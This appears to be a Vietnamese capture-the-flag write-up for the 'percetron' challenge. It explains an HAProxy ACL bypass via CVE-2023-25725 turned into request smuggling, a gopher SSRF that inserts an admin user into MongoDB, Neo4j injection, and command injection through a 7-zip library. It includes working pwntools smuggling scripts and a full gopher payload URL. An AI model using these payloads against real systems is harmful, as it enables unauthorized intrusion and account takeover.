# The challenge
name: percetron

difficulty: hard
## Solution
Bài này mình nắm bắt cách làm từ rất sớm, 90% thời gian làm còn lại là mình tìm cách để bypass đến route `/healthcheck-dev` do ACl của HAproxy chặn. 

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/2594b21d-bd1a-4084-ab04-8cf8d805e5ff)

Hướng làm sẽ như sau, đầu tiên bằng cách nào đó bypass ACL để reach endpoint `/healthcheck-dev` nhằm thực hiện SSRF đến mongodb bằng protocol `gopher`

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/046ae722-d900-4b9f-9b87-9e54bd405145)

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/a684e1ca-84e4-4fac-9203-c411ab839bb2)

Từ đó ta tạo được một account admin, sau đó lợi dụng Neo4j injection tại `/panel/management/addcert` để control filename của cert được add

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/74e9df2a-1b3b-4a70-b8de-7ee4e29c1389)

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/51a595b1-b72d-4fce-88d4-b96544de8a2c)

Khi đó tại endpoint `/panel/management/dl-certs` ta có thể trigger RCE vì khi trace vào method `compress` của thư viện `@steezcram/sevenzip` ta sẽ thấy rằng filename được truyền vào `execFile` với `shell: true`.

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/8e0460ac-efab-4814-aaee-3d4f286df268)

Quan trọng nhất ở bài này sẽ là bước bypass ACL và SSRF lên mongodb
## ACL bypass with `CVE-2023-25725`
CVE này mình đã chú ý đến nó, tuy nhiên khi thử nghiệm mình lại chưa thể lead nó ra HTTP smuggling được. Lỗ hổng của HAProxy là HAProxy sẽ không forward các header nằm phía sau một empty header
Patch:

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/57ba9eb3-a8a4-4630-ba0a-3e823b6b412d)

Vậy thì ta có thể để một Content-Length phía sau một empty header để HAproxy không forward nó về backend => request sẽ không có body và phần body sẽ được xem là request thứ 2, thử kiểm chứng giả thuyết:
```py
from pwn import *

conn = remote("localhost", 1337)

conn.send("""GET /test HTTP/1.1
Host: localhost:1337
:x
Content-Length: 250

GET /healthcheck-dev HTTP/1.1
Host: localhost:1337
Connection: keep-alive
Content-Length: 0
""".replace("\n", "\r\n").encode() + b"\r\n"*50)

conn.interactive()

```
Ở phía server mình dùng netcat để debug

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/dcc0572b-1e51-4a69-ab29-e59a67792ced)

Như bạn thấy, vì không có Content-Length khi forward nên HAProxy đã forward một transfer-encoding để thay thế và biến response thành một chunk => tạch, đây chính là thứ làm mình nghĩ rằng bug này không thể lead ra HTTP smuggling được, tuy nhiên nếu ta đổi version HTTP sử dụng thành 1.0 hoặc 0.9:

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/c24aea9e-b26d-431c-a9d5-e0618650f4c5)

Lần này thì Transfer-Encoding lại không được thêm vào nữa, tại sao lại như thế? 

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/47042670-deb7-44ec-ab30-66ef309441d9)

## H1 decoder
Cùng phân tích patch của HAProxy: https://git.haproxy.org/?p=haproxy-2.7.git;a=commitdiff;h=a0e561ad7f29ed50c473f5a9da664267b60d1112

Ta thấy đầu tiên họ sẽ reject một message có empty header name 

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/cfd3bd41-a4f1-4c9a-84e2-08f13f97c949)

Ngoài ra tại file `h1.c` sẽ thực hiện parse header thành một header list, entry cuối cùng của list sẽ là một entry với empty header name, giống như việc một string sẽ được terminate bằng null byte vậy, việc inject một header có empty header name giống như việc null byte injection đã từng xảy ra trong các phiên bản PHP cũ vậy. Bằng việc inject vào một empty header ta có thể truncate header list và bỏ qua các header còn lại, đó là bản chất của lỗ hổng này. 

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/355fa977-2db7-403f-8650-58f4cb5fdafe)

Vấn đề khi escalate lỗ hổng lên HTTP smuggling đó là khi HTTP sử dụng version 1.1, nếu header Content-Length không có trong header list thì một header `transfer-encoding` sẽ được thêm vào và body sẽ được chuyển thành một chunk

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/d43259fa-4e00-4d30-a2df-bd87be20f121)

Để giải quyết vấn đề này ta chỉ cần down version HTTP sử dụng xuống thành 1.0 hoặc 0.9

```
from pwn import *

conn = remote("localhost", 1337)

conn.send("""GET /test HTTP/1.0
Host: localhost:1337
:x
Content-Length: 250

GET /healthcheck-dev HTTP/1.0
Host: localhost:1337
Connection: keep-alive
Content-Length: 0
""".replace("\n", "\r\n").encode() + b"\r\n"*50)

conn.interactive()
```

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/93e495cf-0e78-468d-9ad5-f769127ecbdd)

Tại sao việc down HTTP version từ 1.1 xuống 1.0 hoặc 0.9 lại khiến HAProxy không convert HTTP message sang format chunked nữa? Đơn giản là vì Transfer-Encoding được support từ HTTP 1.1 trở đi, HAProxy đã implement đúng theo RFC.

## Mongodb protocol
Giờ ta đã reach được endpoint SSRF, vậy làm thế nào để SSRF đến mongodb rồi tạo một account? Cách đơn giản sẽ là mở TCPdump hoặc Wireshark để capture lại packet lúc gửi command lên mongodb, vì ta thấy switch `--noauth` được dùng khi chạy mongo service nên ta sẽ chỉ cần 1 request duy nhất, khi mới nghĩ đến idea này mình đã lo rằng có thể mongodb sẽ thực hiện handshake gì đó trước khi bắt đầu truyền data, mình thử dùng mongosh connect đến netcat và nhận thấy nó gửi một núi data đến, may mắn đây chỉ là client hello nhằm mục đích xác nhận rằng bên server có chạy mongodb.

Sau khi dùng TCPdump ta có được một url như bên dưới:
```
gopher://127.0.0.1:27017/_%1F%01%00%00%0C%00%00%00%00%00%00%00%DD%07%00%00%00%00%00%00%00%0A%01%00%00%02insert%00%06%00%00%00users%00%04documents%00%A7%00%00%00%030%00%9F%00%00%00%02username%00%09%00%00%00hehehehe%00%02password%00%3D%00%00%00%242a%2410%24/KdHSYJIHaQTBEJqkQHKeeecndrfl.M99P1KKUQVS3yuE3Xta5DKG%00%02permission%00%0E%00%00%00administrator%00%07_id%00e%F1%BC%DD%A3y%DB~%91%11kG%10__v%00%00%00%00%00%00%00%08ordered%00%01%03lsid%00%1E%00%00%00%05id%00%10%00%00%00%04%D7%13%CCe%A2%60H%26%97_5G%861fb%00%02%24db%00%0A%00%00%00percetron%00%00
```

Tại đây sẽ tạo một account admin với username là `hehehehe` và pass là `password`, phần còn lại thì đơn giản thôi nên các bạn hãy thử tự mình dựng lại bài này và làm nhé.
